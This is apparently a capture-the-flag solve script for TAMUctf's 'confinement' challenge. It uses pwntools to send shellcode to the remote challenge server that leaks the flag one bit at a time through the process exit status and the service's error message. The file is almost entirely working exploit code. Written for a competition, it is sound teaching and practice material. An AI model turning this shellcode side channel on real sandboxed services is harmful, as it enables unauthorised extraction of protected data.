from pwn import *

context.arch = 'amd64'

flag = b''
ofs = 0x24d50

for i in range(64):
    c = 0
    for j in range(8):
        log.info(f"now i = {i}")
        p = remote("tamuctf.com", 443, ssl=True, sni="confinement")
        # p = process("./confinement")

        shellcode = f'''
            mov     rax, r12
            add     rax, {ofs+i}
            xor     rdi, rdi
            mov     dil,  [rax]
            shr     dil, {j}
            and     dil, 1
            mov     rax, 0xe7
            syscall
        '''

        payload = asm(shellcode)
        p.sendline(payload)

        if b'something went wrong D:' in p.recvline():
            c |= 1 << j

        log.info(f"c = {hex(c)}")

        p.close()

    flag += p8(c)
    log.info(f"flag = {flag}")
